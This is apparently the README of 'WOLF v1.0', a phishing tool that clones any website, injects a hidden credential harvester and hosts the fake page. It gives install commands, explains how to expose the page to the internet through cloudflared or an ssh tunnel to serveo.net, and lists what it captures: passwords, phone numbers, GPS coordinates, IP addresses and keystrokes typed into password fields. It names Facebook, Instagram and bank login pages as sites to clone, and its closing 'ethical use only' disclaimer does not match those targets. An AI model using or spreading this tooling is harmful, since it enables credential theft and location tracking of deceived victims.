╔══════════════════════════════════════════════════════╗
║              WOLF v1.0                              ║
║     Website Cloner & Credential Harvester           ║
║     Clone ANY Website - Capture Login Details       ║
║     Works on Termux & Kali Linux                    ║
║          Created by Redone ⚡                       ║
╚══════════════════════════════════════════════════════╝

INSTALL ON TERMUX:
═══════════════════
cp /sdcard/Download/Wolf.zip ~/
unzip Wolf.zip
cd wolf
bash run.sh

INSTALL ON KALI LINUX:
════════════════════════
unzip Wolf.zip
cd wolf
bash run.sh

HOW IT WORKS:
══════════════
1. Run: bash run.sh
2. Enter URL to clone (any website)
3. Enter port [8080]
4. Wolf downloads the full website
5. Injects hidden credential harvester
6. Hosts cloned site on your machine

SHARING:
═════════
Same WiFi: http://YOUR_LOCAL_IP:8080
Internet:  cloudflared tunnel --url http://localhost:8080
           OR
           ssh -R 80:localhost:8080 serveo.net

WHAT GETS CAPTURED:
════════════════════
✅ Email / Username
✅ Password (from any login form)
✅ Phone number
✅ Device type & browser
✅ GPS coordinates
✅ Google Maps link
✅ IP address
✅ Screen size & timezone
✅ AJAX & Fetch form submits
✅ Real-time password monitoring

ALL FILES SAVED:
════════════════
wolf_capture_TIMESTAMP.json  - Each capture
wolf_all_TIMESTAMP.json      - All captures
wolf_clone.html              - The cloned page

EXAMPLE SITES TO CLONE:
════════════════════════
facechatnetwork.pythonanywhere.com
facebook.com
instagram.com
anybank.com/login
anywebsite.com

PROMPT:
════════
Wolf starts automatically when you run it

⚠️  FOR ETHICAL USE ON YOUR OWN DEVICES ONLY!
Created by Redone ⚡
